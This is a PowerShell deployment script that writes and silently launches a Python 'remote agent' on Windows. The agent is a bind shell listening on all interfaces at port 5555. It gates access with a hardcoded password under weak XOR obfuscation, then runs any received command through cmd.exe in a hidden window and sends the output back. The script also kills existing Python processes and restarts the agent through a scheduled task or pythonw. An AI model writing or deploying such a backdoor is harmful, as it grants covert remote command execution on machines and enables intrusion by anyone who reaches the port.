New-Item -ItemType Directory -Force -Path "C:\RemoteAgent"

$agentCode = @"
import socket
import subprocess
import threading
import base64
import os

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 5555
PASSWORD = "u can see me"
XOR_KEY = "key_xor_2026"

def xor_decrypt(enc_b64_str, key):
    try:
        raw_bytes = base64.b64decode(enc_b64_str.strip())
        key_bytes = key.encode('utf-8')
        decrypted = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(raw_bytes)])
        return decrypted.decode('utf-8', errors='ignore')
    except Exception:
        return ""

def handle_client(conn, addr):
    try:
        conn.sendall(b"AUTH_REQUIRED\n")
        auth_data = conn.recv(1024).decode('utf-8', errors='ignore').strip()
        decrypted_pass = xor_decrypt(auth_data, XOR_KEY)
        
        if decrypted_pass != PASSWORD:
            conn.sendall(b"AUTH_FAILED\n")
            conn.close()
            return
            
        conn.sendall(b"AUTH_OK\n")
        while True:
            cmd = conn.recv(4096).decode('utf-8', errors='ignore').strip()
            if not cmd or cmd.lower() in ["exit", "quit"]:
                break
            
            # تنفيذ الأمر عبر cmd.exe بشكل مباشر مع دعم كامل للأوامر الإدارية
            proc = subprocess.Popen(
                ["cmd.exe", "/c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            stdout, stderr = proc.communicate(timeout=15)
            output = stdout + stderr
            if not output:
                output = b"[+] Command sent and executed successfully.\n"
            conn.sendall(output)
    except Exception as e:
        pass
    finally:
        conn.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr))
        t.daemon = True
        t.start()

if __name__ == "__main__":
    main()
"@

[System.IO.File]::WriteAllText("C:\RemoteAgent\agent.py", $agentCode, [System.Text.Encoding]::UTF8)

# إنهاء العمليات السابقة وإعادة التشغيل
Stop-Process -Name "pythonw" -ErrorAction SilentlyContinue
Stop-Process -Name "python" -ErrorAction SilentlyContinue

Start-ScheduledTask -TaskName "RemoteAgent" -ErrorAction SilentlyContinue
if (-not $?) {
    Start-Process -FilePath "C:\Program Files\Python312\pythonw.exe" -ArgumentList "C:\RemoteAgent\agent.py"
}
